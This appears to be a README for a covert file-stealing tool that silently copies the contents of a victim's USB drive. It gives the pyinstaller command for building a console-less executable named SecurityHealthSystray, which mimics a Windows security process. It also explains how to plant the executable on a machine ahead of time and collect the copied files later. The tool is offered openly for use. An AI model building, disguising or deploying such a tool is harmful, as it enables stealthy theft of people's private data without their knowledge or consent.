# Copy-The-Files-Of-Target-USB
First of all, you must change the extention .py to .pyw after downloading the code. We must convert our .pyw file to .exe to run our .exe file in the background on the device, which the target USB will be inserted. In addition, our .exe file must run in the background without a console. We can get the result we want by writing the following codes in the Command Prompt:
pyinstaller --onefile --noconsole SecurityHealthSystray.pyw
After this process is completed, we will transfer our .exe file to our USB. We will pre-plug our USB to the device previously that the target USB will be inserted and we will run our own .exe file. Other processes will work as in the code. After the copying process is complete, you can insert your own USB into that device and transfer the files on the target USB to your own USB. There is no need for both USBs to be plugged in at the same time for this process to take place. You will understand the process when you read the code.
